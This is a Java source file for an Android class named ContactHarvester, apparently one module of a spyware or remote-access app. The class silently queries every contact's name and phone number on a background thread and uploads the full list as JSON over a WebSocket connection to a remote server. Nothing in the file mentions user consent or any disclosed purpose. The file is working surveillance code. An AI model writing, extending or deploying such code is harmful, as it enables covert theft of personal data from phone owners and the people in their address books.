package com.xrc.system.features;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactHarvester {
    private static final String TAG = Constants.TAG + ":Contacts";
    private static ContactHarvester instance;
    private final Context ctx;

    private ContactHarvester(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized ContactHarvester get(Context ctx) {
        if (instance == null) instance = new ContactHarvester(ctx);
        return instance;
    }

    public void harvestAndSend() {
        new Thread(() -> {
            Cursor cursor = null;
            try {
                cursor = ctx.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{
                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                ContactsContract.CommonDataKinds.Phone.NUMBER
                        }, null, null, null);
                if (cursor == null) return;
                JSONArray arr = new JSONArray();
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    JSONObject obj = new JSONObject();
                    obj.put("name", name);
                    obj.put("number", number);
                    arr.put(obj);
                }
                JSONObject data = new JSONObject();
                data.put("contacts", arr);
                XRCWebSocketClient.get(ctx).sendEvent("contacts", data);
            } catch (Exception e) {
                Log.e(TAG, "Harvest failed", e);
            } finally {
                if (cursor != null) cursor.close();
            }
        }).start();
    }
}
